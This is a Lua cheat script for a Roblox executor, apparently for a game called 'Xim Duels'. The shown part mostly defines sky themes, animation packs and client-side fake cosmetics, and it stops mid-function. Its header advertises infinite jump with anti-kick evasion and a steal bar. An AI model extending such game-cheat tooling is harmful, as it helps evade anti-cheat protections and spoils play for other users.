-- [[ Xim Duels ]] - Menu ribassato, barra furto bianca, pulsanti mobili trascinabili singolarmente
-- No background image, infinite jump (BodyVelocity anti-kick), smooth page scrolling

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local player = Players.LocalPlayer

-- Master table
local M = {}

-- ------------------------------------------------------------
-- EARLY CONFIG LOAD
-- ------------------------------------------------------------
M.introSoundEnabled = false
M.introSongChoice = 3
M.introGUIEnabled = true
-- Fixed intro track (Shadow.VS / VYNX 2.1 style) — not changeable
M.INTRO_MUSIC_URL = "https://files.catbox.moe/qhpfe5.mp3"
M.INTRO_MUSIC_FILE = "VynxIntro_Music.mp3"
introSoundInstance = nil
if isfile and isfile("CherryConfig.json") then
    local ok, data = pcall(function() return HS:JSONDecode(readfile("CherryConfig.json")) end)
    if ok and type(data) == "table" then
        -- intro song removed — always off
        M.introSoundEnabled = false
        if data.introSongChoice then M.introSongChoice = data.introSongChoice end
        if data.introGUIEnabled ~= nil then M.introGUIEnabled = data.introGUIEnabled end
        if data.Theme and type(data.Theme)=="string" then M._savedTheme = data.Theme; M.colorScheme = data.Theme end
        if data.colorScheme and type(data.colorScheme)=="string" then M.colorScheme = data.colorScheme; M._savedTheme = data.colorScheme end
    end
end

-- ============================================================
-- SKY THEME (unchanged)
-- ============================================================
M.CANDY_SKY_TAG = "MoveeSkyTheme"
M.currentSkyTheme = "Night"
M.cleanSkyEnabled = true
M._cleanSkySaved = nil
M.CANDY_SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
    ["Blue Sky"]={clock=12,brightness=2.6,ambient={140,180,230},outAmb={150,190,240},sky={stars=0,sun=14,moon=0},atm={dens=0.22,color={120,180,255},decay={90,140,220},glare=1.2,haze=1.0},clouds={cover=0.35,dens=0.4,color={220,235,255}}},
    ["Xim Sky"]={clock=14,brightness=2.4,ambient={40,40,48},outAmb={50,50,60},sky={stars=2500,sun=10,moon=12,moonTex=true},atm={dens=0.35,color={30,30,40},decay={20,20,30},glare=0.8,haze=1.2},clouds={cover=0.4,dens=0.5,color={60,60,70}}},
}
M.SkyOrder = {"Off","Blue Sky","Xim Sky","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}

local function candyColor(rgb) return Color3.fromRGB(rgb[1],rgb[2],rgb[3]) end
function M.CandyApplyCustomSky(mode)
    for _,child in ipairs(Lighting:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end
    local terrain=workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end end
    local preset=M.CANDY_SKY_PRESETS[mode]
    if not preset or preset.kind=="off" then Lighting.ClockTime=14;Lighting.Brightness=2;Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127);Lighting.Ambient=Color3.fromRGB(127,127,127);Lighting.FogEnd=100000;Lighting.GlobalShadows=true;return end
    Lighting.FogStart=0;Lighting.FogEnd=100000;Lighting.FogColor=Color3.fromRGB(40, 40, 40);Lighting.ColorShift_Top=Color3.fromRGB(0,0,0);Lighting.ColorShift_Bottom=Color3.fromRGB(0,0,0);Lighting.GlobalShadows=true
    Lighting.ClockTime=preset.clock or 14;Lighting.Brightness=preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient=candyColor(preset.outAmb) end
    if preset.ambient then Lighting.Ambient=candyColor(preset.ambient) end
    if preset.sky then
        local skyInst=Instance.new("Sky");skyInst:SetAttribute(M.CANDY_SKY_TAG,true)
        if preset.sky.stars then skyInst.StarCount=preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize=preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize=preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId="rbxasset://sky/moon.jpg" end
        skyInst.Parent=Lighting
    end
    if preset.atm then
        local atm=Instance.new("Atmosphere");atm:SetAttribute(M.CANDY_SKY_TAG,true)
        atm.Density=preset.atm.dens or 0.3;atm.Color=candyColor(preset.atm.color);atm.Decay=candyColor(preset.atm.decay);atm.Glare=preset.atm.glare or 1;atm.Haze=preset.atm.haze or 1;atm.Parent=Lighting
    end
    if preset.clouds and terrain then
        local clouds=Instance.new("Clouds");clouds:SetAttribute(M.CANDY_SKY_TAG,true)
        clouds.Cover=preset.clouds.cover or 0.5;clouds.Density=preset.clouds.dens or 0.5;clouds.Color=candyColor(preset.clouds.color);clouds.Parent=terrain
    end
end

-- Clean Sky + light optimizer (bright outdoor day like classic maps)
local CLEAN_SKY_TAG = "VynxCleanSky"
function M.applyCleanSky(on)
    on = on == true
    M.cleanSkyEnabled = on
    if on then
        -- save current lighting snapshot once
        if not M._cleanSkySaved then
            M._cleanSkySaved = {
                ClockTime = Lighting.ClockTime,
                Brightness = Lighting.Brightness,
                Ambient = Lighting.Ambient,
                OutdoorAmbient = Lighting.OutdoorAmbient,
                FogStart = Lighting.FogStart,
                FogEnd = Lighting.FogEnd,
                FogColor = Lighting.FogColor,
                GlobalShadows = Lighting.GlobalShadows,
                ColorShift_Top = Lighting.ColorShift_Top,
                ColorShift_Bottom = Lighting.ColorShift_Bottom,
                ExposureCompensation = Lighting.ExposureCompensation,
            }
        end
        -- strip themed sky/atmosphere/clouds
        for _, child in ipairs(Lighting:GetChildren()) do
            if child:GetAttribute(M.CANDY_SKY_TAG) or child:GetAttribute(CLEAN_SKY_TAG)
                or child:IsA("Sky") or child:IsA("Atmosphere") or child:IsA("BloomEffect")
                or child:IsA("ColorCorrectionEffect") or child:IsA("SunRaysEffect")
                or child:IsA("BlurEffect") or child:IsA("DepthOfFieldEffect") then
                pcall(function() child:Destroy() end)
            end
        end
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            for _, child in ipairs(terrain:GetChildren()) do
                if child:IsA("Clouds") or child:GetAttribute(M.CANDY_SKY_TAG) or child:GetAttribute(CLEAN_SKY_TAG) then
                    pcall(function() child:Destroy() end)
                end
            end
        end
        -- bright clear daytime (screenshot-style clean outdoor)
        Lighting.ClockTime = 14
        Lighting.Brightness = 2.2
        Lighting.Ambient = Color3.fromRGB(170, 170, 175)
        Lighting.OutdoorAmbient = Color3.fromRGB(155, 160, 170)
        Lighting.FogStart = 0
        Lighting.FogEnd = 100000
        Lighting.FogColor = Color3.fromRGB(192, 210, 230)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.GlobalShadows = false -- optimizer
        pcall(function() Lighting.ExposureCompensation = 0 end)
        pcall(function() Lighting.EnvironmentDiffuseScale = 1 end)
        pcall(function() Lighting.EnvironmentSpecularScale = 0.25 end)

        local sky = Instance.new("Sky")
        sky:SetAttribute(CLEAN_SKY_TAG, true)
        sky.StarCount = 0
        sky.SunAngularSize = 11
        sky.MoonAngularSize = 0
        sky.CelestialBodiesShown = true
        -- default clear skyboxes (empty = engine default blue)
        sky.SkyboxBk = "rbxassetid://6444884337"
        sky.SkyboxDn = "rbxassetid://6444884780"
        sky.SkyboxFt = "rbxassetid://6444884337"
        sky.SkyboxLf = "rbxassetid://6444884337"
        sky.SkyboxRt = "rbxassetid://6444884337"
        sky.SkyboxUp = "rbxassetid://6413114215"
        sky.Parent = Lighting

        local atm = Instance.new("Atmosphere")
        atm:SetAttribute(CLEAN_SKY_TAG, true)
        atm.Density = 0.18
        atm.Offset = 0
        atm.Color = Color3.fromRGB(199, 215, 235)
        atm.Decay = Color3.fromRGB(150, 175, 210)
        atm.Glare = 0.2
        atm.Haze = 0.4
        atm.Parent = Lighting

        -- light optimizer: lower dense effects
        pcall(function()
            if settings and settings().Rendering then
                settings().Rendering.QualityLevel = Enum.QualityLevel.Level05
            end
        end)
        pcall(function()
            if typeof(setfpscap) == "function" then setfpscap(240) end
        end)
    else
        -- remove clean sky instances
        for _, child in ipairs(Lighting:GetChildren()) do
            if child:GetAttribute(CLEAN_SKY_TAG) then
                pcall(function() child:Destroy() end)
            end
        end
        local s = M._cleanSkySaved
        if s then
            pcall(function()
                Lighting.ClockTime = s.ClockTime
                Lighting.Brightness = s.Brightness
                Lighting.Ambient = s.Ambient
                Lighting.OutdoorAmbient = s.OutdoorAmbient
                Lighting.FogStart = s.FogStart
                Lighting.FogEnd = s.FogEnd
                Lighting.FogColor = s.FogColor
                Lighting.GlobalShadows = s.GlobalShadows
                Lighting.ColorShift_Top = s.ColorShift_Top
                Lighting.ColorShift_Bottom = s.ColorShift_Bottom
                Lighting.ExposureCompensation = s.ExposureCompensation
            end)
        end
        -- re-apply sky theme if not Off
        if M.currentSkyTheme and M.currentSkyTheme ~= "Off" then
            pcall(function() M.CandyApplyCustomSky(M.currentSkyTheme) end)
        end
    end
end

-- ============================================================
-- ANIMATION PACKS (unchanged)
-- ============================================================
M.PACKS = {
    ["Adidas Sports"] = {
        WalkAnim = 18537392113,
        RunAnim  = 18537384940,
        JumpAnim = 18537380791,
        FallAnim = 18537367238,
        SwimIdle = 18537387180,
        Swim     = 18537389531,
        Animation1 = 18537376492,
        Animation2 = 18537371272,
        ClimbAnim = 18537363391,
    },
    ["Adidas Community"] = {
        WalkAnim = 122150855457006,
        RunAnim  = 82598234841035,
        JumpAnim = 75290611992385,
        FallAnim = 98600215928904,
        SwimIdle = 109346520324160,
        Swim     = 133308483266208,
        Animation1 = 122257458498464,
        Animation2 = 102357151005774,
        ClimbAnim = 88763136693023,
    },
    ["Adidas Aura"] = {
        WalkAnim = 83842218823011,
        RunAnim  = 118320322718866,
        JumpAnim = 109996626521204,
        FallAnim = 95603166884636,
        SwimIdle = 94922130551805,
        Swim     = 134530128383903,
        Animation1 = 110211186840347,
        Animation2 = 114191137265065,
        ClimbAnim = 97824616490448,
    },
    ["Wicked Popular"] = {
        WalkAnim = 92072849924640,
        RunAnim = 72301599441680,
        JumpAnim = 104325245285198,
        FallAnim = 121152442762481,
        Animation1 = 118832222982049,
        ClimbAnim = 131326830509784,
        SwimIdle = 113199415118199,
        Swim = 99384245425157,
        Animation2 = 76049494037641,
    },
    Elder = {
        WalkAnim = 10921111375,
        RunAnim  = 10921104374,
        JumpAnim = 10921107367,
        FallAnim = 10921105765,
        SwimIdle = 10921110146,
        Swim     = 10921108971,
        ClimbAnim = 10921100400,
        Animation1 = 10921101664,
        Animation2 = 10921102574,
    },
    Zombie = {
        WalkAnim = 10921355261,
        RunAnim  = 616163682,
        JumpAnim = 10921351278,
        FallAnim = 10921350320,
        SwimIdle = 10921353442,
        Swim     = 10921352344,
        Animation1 = 10921344533,
        Animation2 = 10921345304,
        ClimbAnim = 10921343576,
    },
    Mage = {
        WalkAnim = 10921152678,
        RunAnim  = 10921148209,
        JumpAnim = 10921149743,
        FallAnim = 10921148939,
        SwimIdle = 10921151661,
        Swim     = 10921150788,
        ClimbAnim = 10921143404,
        Animation1 = 10921144709,
        Animation2 = 10921145797,
    },
    ["Catwalk Glam"] = {
        WalkAnim = 109168724482748,
        RunAnim  = 81024476153754,
        JumpAnim = 116936326516985,
        FallAnim = 92294537340807,
        SwimIdle = 98854111361360,
        Swim     = 134591743181628,
        ClimbAnim = 119377220967554,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    Astronaut = {
        WalkAnim = 10921046031,
        RunAnim  = 10921039308,
        JumpAnim = 10921042494,
        FallAnim = 10921040576,
        SwimIdle = 10921045006,
        Swim     = 10921044000,
        ClimbAnim = 10921032124,
        Animation1 = 10921034824,
        Animation2 = 10921036806,
    },
    ['Wicked "Dancing Through Life"'] = {
        WalkAnim = 73718308412641,
        RunAnim  = 135515454877967,
        JumpAnim = 78508480717326,
        FallAnim = 78147885297412,
        SwimIdle = 129183123083281,
        Swim     = 110657013921774,
        ClimbAnim = 129447497744818,
        Animation1 = 92849173543269,
        Animation2 = 132238900951109,
    },
    Werewolf = {
        WalkAnim = 10921342074,
        RunAnim  = 10921336997,
        JumpAnim = nil,
        FallAnim = 10921337907,
        SwimIdle = 10921341319,
        Swim     = 10921340419,
        ClimbAnim = 10921329322,
        Animation1 = 10921330408,
        Animation2 = 10921333667,
    },
    Superhero = {
        WalkAnim = 10921298616,
        RunAnim  = 10921291831,
        JumpAnim = 10921294559,
        FallAnim = 10921293373,
        SwimIdle = 10921297391,
        Swim     = 10921295495,
        ClimbAnim = 10921286911,
        Animation1 = 10921288909,
        Animation2 = 10921290167,
    },
    Toy = {
        WalkAnim = 10921312010,
        RunAnim  = 10921306285,
        JumpAnim = 10921308158,
        FallAnim = 10921307241,
        SwimIdle = 10921310341,
        Swim     = 10921309319,
        ClimbAnim = 10921300839,
        Animation1 = 10921301576,
        Animation2 = nil,
    },
    ["No Boundaries"] = {
        WalkAnim = 18747074203,
        RunAnim  = 18747070484,
        JumpAnim = 18747069148,
        FallAnim = 18747062535,
        SwimIdle = 18747071682,
        Swim     = 18747073181,
        ClimbAnim = 18747060903,
        Animation1 = 18747067405,
        Animation2 = 18747063918,
    },
    NFL = {
        WalkAnim = 110358958299415,
        RunAnim  = 117333533048078,
        JumpAnim = 119846112151352,
        FallAnim = 129773241321032,
        SwimIdle = 79090109939093,
        Swim     = 132697394189921,
        ClimbAnim = 134630013742019,
        Animation1 = 92080889861410,
        Animation2 = 74451233229259,
    },
    ["Amazon Unboxed"] = {
        WalkAnim = 90478085024465,
        RunAnim  = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 129126268464847,
        Swim     = 105962919001086,
        ClimbAnim = 121145883950231,
        Animation1 = 98281136301627,
        Animation2 = nil,
    },
    Tryhard = {
        WalkAnim = 707897309,
        RunAnim  = 707861613,
        JumpAnim = 116936326516985,
        FallAnim = 116936326516985,
        SwimIdle = 116936326516985,
        Swim     = 116936326516985,
        ClimbAnim = 116936326516985,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    Vampire = {
        WalkAnim = 10921326949,
        RunAnim  = 10921320299,
        JumpAnim = 10921322186,
        FallAnim = 10921321317,
        SwimIdle = 10921325443,
        Swim     = 10921324408,
        ClimbAnim = 10921314188,
        Animation1 = 10921315373,
        Animation2 = nil,
    },
    Ninja = {
        Run=656118852, Walk=656121766, Jump=656117878, Fall=656115606,
        Swim=656119721, SwimIdle=656121397, Climb=656114359,
        Idle={656117400,656118341,886742569}
    },
    Robot = {
        Run=616091570, Walk=616095330, Jump=616090535, Fall=616087089,
        Swim=616092998, SwimIdle=616094091, Climb=616086039,
        Idle={616088211,616089559,885531463}
    },
    Levitation = {
        Run=616010382, Walk=616013216, Jump=616008936, Fall=616005863,
        Swim=616011509, SwimIdle=616012453, Climb=616003713,
        Idle={616006778,616008087,886862142}
    },
    Stylish = {
        Run=616140816, Walk=616146177, Jump=616139451, Fall=616134815,
        Swim=616143378, SwimIdle=616144772, Climb=616133594,
        Idle={616136790,616138447,886888594}
    },
    Bubbly = {
        Run=910025107, Walk=910034870, Jump=910016857, Fall=910001910,
        Swim=910028158, SwimIdle=910030921, Climb=909997997,
        Idle={910004836,910009958,1018536639}
    },
    Cartoon = {
        Run=742638842, Walk=742640026, Jump=742637942, Fall=742637151,
        Swim=742639220, SwimIdle=742639812, Climb=742636889,
        Idle={742637544,742638445,885477856}
    },
}
M.animPack = nil
M.animPackEnabled = false -- off = base game anims
M.savedAnimate = nil
M.vynxBlackSkinEnabled = false -- keep original avatar skin

-- ============================================================
-- CHARTER FEATURES (Headless & Korblox)
-- ============================================================
M.headlessEnabled = false -- keep original head
M.korbloxEnabled = false -- keep original legs

local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local DARK_GREY_COLOR = Color3.fromRGB(64, 64, 64)

local function removeFace(head)
    local face = head:FindFirstChild("face")
    if face then face:Destroy() end
end

function M.applyHeadlessToChar(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        removeFace(head)

        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.MeshId == HEADLESS_MESH_ID then
                child:Destroy()
            end
        end

        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Name = "HeadlessMesh"
        mesh.Parent = head

        head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then
                head.Transparency = 1
            end
        end)
        head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then
                child:Destroy()
            end
        end)
    else
        head.Transparency = 0
        head.CanCollide = true
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
                child:Destroy()
            end
        end
        removeFace(head)
    end
end

function M.applyKorbloxToChar(char, enabled)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if enabled then
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then
                        child:Destroy()
                    end
                end
                rightLeg.Color = DARK_GREY_COLOR
                rightLeg:GetPropertyChangedSignal("Color"):Connect(function()
                    if rightLeg.Color ~= DARK_GREY_COLOR then
                        rightLeg.Color = DARK_GREY_COLOR
                    end
                end)
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = rightLeg
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 1
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 1 end
                if rightFoot then rightFoot.Transparency = 1 end

                local oldKorblox = char:FindFirstChild("KorbloxLeg")
                if oldKorblox then oldKorblox:Destroy() end

                local korbloxLeg = Instance.new("Part")
                korbloxLeg.Name = "KorbloxLeg"
                korbloxLeg.Size = Vector3.new(1, 2, 1)
                korbloxLeg.Anchored = false
                korbloxLeg.CanCollide = false
                korbloxLeg.Color = DARK_GREY_COLOR
                korbloxLeg.Parent = char

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = korbloxLeg

                local weld = Instance.new("Weld")
                weld.Part0 = rightUpperLeg
                weld.Part1 = korbloxLeg
                weld.C0 = CFrame.new(0, -0.8, 0)
                weld.Name = "KorbloxWeld"
                weld.Parent = korbloxLeg
            end
        end
    else
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
                        child:Destroy()
                    end
                end
                rightLeg.Color = Color3.fromRGB(255, 255, 255)
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 0
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 0 end
                if rightFoot then rightFoot.Transparency = 0 end
                local korbloxLeg = char:FindFirstChild("KorbloxLeg")
                if korbloxLeg then korbloxLeg:Destroy() end
            end
        end
    end
end

function M.applyCharterToChar(char)
    if not char then return end
    -- Only apply optional cosmetics if the user enabled them (default: all OFF)
    -- Never force black skin / headless / korblox — keep original avatar
    if M.headlessEnabled then
        pcall(function() M.applyHeadlessToChar(char, true) end)
    end
    if M.korbloxEnabled then
        pcall(function() M.applyKorbloxToChar(char, true) end)
    end
    if M.vynxBlackSkinEnabled then
        pcall(function() M.applyVynxBlackSkin(char) end)
    end
    -- Do NOT touch unwalk / anim packs here (persist across reset/rejoin)
end

-- Strip shirts/pants only — KEEP accessories + hair (do not eliminate them)
function M.stripVynxClothing(char)
    if not char then return end
    for _, c in ipairs(char:GetChildren()) do
        if c:IsA("Shirt") or c:IsA("Pants")
            or c:IsA("ShirtGraphic") or c:IsA("Clothing")
            or c.ClassName == "LayeredClothing" then
            if not c:GetAttribute("VynxChip") then
                pcall(function() c:Destroy() end)
            end
        end
        -- Accessories / Hats / Hair: NEVER destroy
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    pcall(function()
        if not hum then return end
        local desc = hum:GetAppliedDescription()
        if not desc then return end
        desc.Shirt = 0
        desc.Pants = 0
        desc.GraphicTShirt = 0
        pcall(function() hum:ApplyDescription(desc) end)
    end)
end

-- Remove any floating belly/torso VYNX chip
function M.clearVynxTorsoChip(char)
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part.Name == "VynxTorsoChipBB" or part.Name == "VynxTorsoChipSG" then
            pcall(function() part:Destroy() end)
        end
    end
end

-- Red VYNX tag on pants/legs (same for every executor)
function M.attachVynxPantsTag(char)
    if not char then return end
    local legNames = {
        "LeftLowerLeg", "RightLowerLeg", "LeftUpperLeg", "RightUpperLeg",
        "Left Leg", "Right Leg",
    }
    for _, name in ipairs(legNames) do
        local leg = char:FindFirstChild(name)
        if leg then
            for _, c in ipairs(leg:GetChildren()) do
                if c.Name == "VynxPantsTag" or c:GetAttribute("VynxChip") then
                    pcall(function() c:Destroy() end)
                end
            end
            for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back}) do
                local sg = Instance.new("SurfaceGui")
                sg.Name = "VynxPantsTag"
                sg:SetAttribute("VynxChip", true)
                sg.Face = face
                sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
                sg.PixelsPerStud = 80
                sg.Parent = leg
                local f = Instance.new("Frame")
                f.Size = UDim2.new(0.95, 0, 0.45, 0)
                f.Position = UDim2.new(0.025, 0, 0.28, 0)
                f.BackgroundTransparency = 1
                f.Parent = sg
                local t = Instance.new("TextLabel")
                t.Size = UDim2.new(1, 0, 1, 0)
                t.BackgroundTransparency = 1
                t.Text = "XIM"
                t.TextColor3 = (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
                t.Font = Enum.Font.GothamBlack
                t.TextScaled = true
                t.TextStrokeTransparency = 0.25
                t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                t.Parent = f
            end
        end
    end
end

-- Black hat with red VYNX text on head
-- VYNX red text on belly (SurfaceGui on torso — not floating)
function M.attachVynxBellyTag(char)
    if not char then return end
    local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not torso then return end
    for _, c in ipairs(torso:GetChildren()) do
        if c.Name == "VynxBellyTag" or c.Name == "VynxTorsoChipBB" or c.Name == "VynxTorsoChipSG" then
            pcall(function() c:Destroy() end)
        end
    end
    for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back}) do
        local sg = Instance.new("SurfaceGui")
        sg.Name = "VynxBellyTag"
        sg:SetAttribute("VynxChip", true)
